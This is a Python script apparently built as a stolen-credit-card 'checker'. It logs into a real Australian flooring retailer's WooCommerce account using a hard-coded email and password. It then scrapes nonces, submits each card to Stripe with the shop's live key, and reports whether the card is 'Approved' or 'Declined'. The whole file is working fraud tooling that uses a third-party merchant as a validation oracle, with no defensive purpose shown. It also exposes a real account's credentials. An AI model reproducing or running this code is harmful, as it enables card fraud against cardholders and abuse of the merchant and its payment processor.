import requests
import random
import re
import json
import uuid

def check_card(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return {"cc": ccx, "response": "Invalid card format. Use CC|MM|YYYY|CVV", "status": "Declined", "gateway": "Stripe Auth"}

        n, mm, yy, cvc = parts

        # Create a session
        session = requests.Session()

        # Random user-agent
        user_agents = [
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
        ]
        random_user_agent = random.choice(user_agents)

        # Step 1: Login to your WooCommerce account
        headers_get = {
            'user-agent': random_user_agent
        }
        response = session.get('https://thefloordepot.com.au/my-account/', headers=headers_get)
        match = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', response.text)
        if not match:
            return {"cc": ccx, "response": "Nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
        nonce_value = match.group(1)

        headers_post = {
            'user-agent': random_user_agent
        }
        data_login = {
            'username': 'frabsok@gmail.com',
            'password': 'Sh@7380046305',
            'rememberme': 'forever',
            'woocommerce-login-nonce': nonce_value,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        session.post('https://thefloordepot.com.au/my-account/', headers=headers_post, data=data_login)

        # Step 2: Get add_card_nonce
        response = session.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers={'user-agent': random_user_agent})
        match = re.search(r'"add_card_nonce":"([a-zA-Z0-9]+)"', response.text)
        if not match:
            return {"cc": ccx, "response": "add_card_nonce not found", "status": "Declined", "gateway": "Stripe Auth"}
        add_card_nonce = match.group(1)

        # Step 3: Create a new Stripe source
        stripe_data = {
            "referrer": "https://thefloordepot.com.au",
            "type": "card",
            "owner[name]": "+",
            "owner[email]": "frabsok@gmail.com",
            "card[number]": n,
            "card[cvc]": cvc,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "guid": uuid.uuid4().hex,
            "muid": uuid.uuid4().hex,
            "sid": uuid.uuid4().hex,
            "payment_user_agent": "stripe.js/ stripe-js-v3/ split-card-element",
            "time_on_page": str(1000),  # Must be string
            "key": "pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq"
        }

        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': random_user_agent
        }

        response = session.post('https://api.stripe.com/v1/sources', headers=headers_stripe, data=stripe_data)
        stripe_response = response.json()

        if 'error' in stripe_response:
            error_code = stripe_response['error']['code']
            error_message = stripe_response['error']['message']
            if error_code == 'card_declined':
                return {"cc": ccx, "response": "Card was declined", "status": "Declined", "gateway": "Stripe Auth"}
            return {"cc": ccx, "response": error_message, "status": "Declined", "gateway": "Stripe Auth"}

        source_id = stripe_response.get('id', '')
        if not source_id:
            return {"cc": ccx, "response": "Payment source creation failed", "status": "Declined", "gateway": "Stripe Auth"}

        # Step 4: Attach source to WooCommerce setup intent
        headers_setup = {
            'user-agent': random_user_agent,
            'X-Requested-With': 'XMLHttpRequest'
        }
        data_setup = {
            'stripe_source_id': source_id,
            'nonce': add_card_nonce
        }
        response = session.post('https://thefloordepot.com.au/', params={'wc-ajax': 'wc_stripe_create_setup_intent'}, headers=headers_setup, data=data_setup)

        try:
            setup_data = response.json()
        except json.JSONDecodeError:
            return {"cc": ccx, "response": "Invalid JSON response from server", "status": "Declined", "gateway": "Stripe Auth"}

        if setup_data.get('success', False):
            status = setup_data['data'].get('status')
            if status == 'requires_action':
                return {"cc": ccx, "response": "OTP_REQUIRED", "status": "Approved", "gateway": "Stripe Auth"}
            elif status == 'succeeded':
                return {"cc": ccx, "response": "Succeeded", "status": "Approved", "gateway": "Stripe Auth"}
            elif 'error' in setup_data['data']:
                error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth"}

        if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
            error_msg = setup_data['data']['error'].get('message', 'Unknown error')
            return {"cc": ccx, "response": error_msg, "status": "Declined", "gateway": "Stripe Auth"}

        return {"cc": ccx, "response": str(setup_data), "status": "Declined", "gateway": "Stripe Auth"}

    except Exception as e:
        return {"cc": ccx, "response": f"Setup Intent Failed: {str(e)}", "status": "Declined", "gateway": "Stripe Auth"}
